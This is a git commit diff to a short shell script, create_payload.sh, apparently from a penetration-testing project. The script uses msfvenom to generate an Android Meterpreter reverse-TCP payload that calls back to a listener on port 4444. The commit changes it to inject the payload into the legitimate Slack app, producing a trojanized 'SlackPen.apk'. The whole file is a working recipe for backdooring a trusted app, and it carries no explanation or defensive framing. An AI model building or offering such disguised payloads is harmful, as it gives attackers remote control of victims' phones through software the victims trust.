7a2523ac5cdf54af6d02f51c30e50b2f5f73c1e5
ChooseYourPlan <timweissenfels7@gmail.com>
2019-10-24 19:46:32 +0200

    Changed Settings

--- create_payload.sh
+++ create_payload.sh
@@ -1,2 +1,2 @@
-sudo metasploit-framework/msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk
+sudo metasploit-framework/msfvenom -x Slack.apk -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk
 sudo chmod +x SlackPen.apk
